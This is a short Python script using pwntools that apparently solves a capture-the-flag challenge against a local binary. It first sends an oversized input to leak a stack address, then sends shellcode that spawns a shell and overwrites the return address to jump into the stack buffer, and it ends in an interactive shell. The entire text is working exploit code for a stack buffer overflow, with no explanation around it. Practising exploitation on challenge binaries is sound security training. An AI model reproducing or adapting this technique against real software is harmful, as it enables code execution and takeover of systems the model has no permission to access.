#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64')

io = process('./bin/challenge')

io.recvline()

PAYLOAD_LEN = 399

# Leak stack pointer
payload = b''
payload += b'()'*40
payload = payload.ljust(0xD0, b'A')
io.send(payload)
leak = io.recvn(len(payload) + 6)[len(payload):]
io.recvline()
io.recvline()

# Calculate buffer address
leak_sp = u64(leak.ljust(8, b'\0'))
log.info('Leak SP: %#x', leak_sp)
buffer_addr = leak_sp - 400

# Put shellcode in buffer and return to it
payload = b''
payload += asm(shellcraft.sh())
payload += b'()'*40
payload = payload.ljust(0xD8, b'A')
payload += p64(buffer_addr)
io.send(payload)
io.recvline()
io.recvline()

io.interactive()
